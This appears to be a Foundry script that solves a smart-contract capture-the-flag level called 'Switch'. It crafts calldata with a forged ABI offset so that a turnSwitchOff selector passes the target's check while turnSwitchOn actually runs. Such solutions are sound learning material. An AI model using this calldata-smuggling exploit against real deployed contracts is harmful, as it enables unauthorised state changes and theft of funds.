// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

contract SwitchSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 onSelector  = bytes4(keccak256("turnSwitchOn()"));

        /*
        Craft calldata manually:

        Layout:
        [flipSelector]
        [offset = 0x60]
        [padding]
        [fake data (offSelector) at position 68]
        [real data (onSelector) later]
        */

        bytes memory data = abi.encodePacked(
            flipSelector,
            uint256(0x60),          // offset to _data
            uint256(0),             // padding
            offSelector,            // passes check (at pos 68)
            uint256(4),             // length of actual data
            onSelector              // executed
        );

        (bool success,) = target.call(data);
        require(success, "exploit failed");

        vm.stopBroadcast();
    }
}